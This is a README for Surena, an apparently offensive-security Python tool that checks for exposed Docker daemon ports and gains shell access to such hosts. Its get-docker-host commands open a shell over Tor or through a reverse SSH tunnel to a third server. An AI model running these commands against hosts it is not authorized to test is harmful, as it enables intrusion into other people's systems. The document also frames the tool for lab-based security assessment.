# Surena

Surena is a tool developed to assess vulnerabilities in Docker daemons when their ports are exposed to a TCP network. It is developed using Click, a Python CLI library, and the Docker SDK for Python. Surena demonstrates how a hacker can gain shell access from an insecure Docker host using two methods: Tor Network and SSH Reverse Tunneling.

To explain how Surena works and how to use these methods, we have written an article on Medium that you can read by following this link: Medium Article.

## Installation

You can install Surena from PyPI by running the following command:

```bash
pip install surena
```

Once installed, you can run Surena using the following commands in your terminal. To view the available commands and options, you can run following command:

```bash
surena --help
```

Surena has two command those are "is-docker-host" and "get-docker-host".

### is-docker-host command
"is-docker-host" command is used for checking the Docker daemon's port is accessible from the network or not. for understanding its options you can run like following command:
```bash
poetry run surena is-docker-host --help
```
for instance you can run this command with below options:
```bash
poetry run surena is-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT
```

### get-docker-host command
"get-docker-host" command is used for gain shell access from docker daemon with using two method. for understanding its options you can run like following command:

```bash
surena get-docker-host --help
```

for instance for gain shell access by usinf Tor Network method,you can run this command with below options:

```bash
surena get-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT --access-method tor
```

for instance for gain shell access by using Reverse SSH Tunneling method, you can run this command with below options:

```bash
surena get-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT --access-method reverse-ssh --ssh-server-address $THIRD_SERVER_IP --ssh-server-username $THIRD_SERVER_USERNAME --ssh-server-password $THIRD_SERVER_PASSWORD --ssh-server-port $THIRD_SERVER_SSH_PORT
```

Please note: Surena is intended for lab use and for understanding whether your Docker daemon is secure or insecure. DO NOT USE SURENA FOR MALICIOUS ACTIVITIES.
